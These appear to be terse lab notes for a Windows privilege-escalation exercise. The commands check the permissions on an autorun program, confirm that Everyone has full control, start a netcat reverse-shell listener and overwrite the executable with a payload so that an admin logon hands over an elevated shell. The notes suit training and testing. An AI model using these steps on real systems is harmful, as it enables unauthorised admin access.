(checklist)

- port scan
- version scan
- service scan

COMMANDS:
C:\Users\user\Desktop\Tools
 -Select the “Logon”tab and notice that the Image Path of “My Program” is pointing to “C:\Program Files\Autorun Program\program.exe"

Check the permissions of program.exe using PowerShell:
 - Get-ChildItem "C:\Program Files\Autorun Program\" -Recurse | Get-Acl | select Path,Owner,AccessToString,Group | Format-List
   - AccessToString : Everyone Allow  FullControl

Verify permission:
C:\Users\user\Desktop\Tools\accesschk64.exe -wvu "C:\Program Files\Autorun Program\program.exe"
 - RW Everyone | FILE_ALL_ACCESS

nc -nlvp 4443

Copy the payload to "C:\Program Files\Autorun Program\program.exe"
 - copy usp_payload.exe "C:\Program Files\Autorun Program\program.exe"

Log off as a “user”account and log back inas “admin”account to simulate an admin accessing his account and wait for a connection with admin privilegein our listener.

In adminaccount, you will be prompted with a security warning, select “Run”.

go back to listening terminal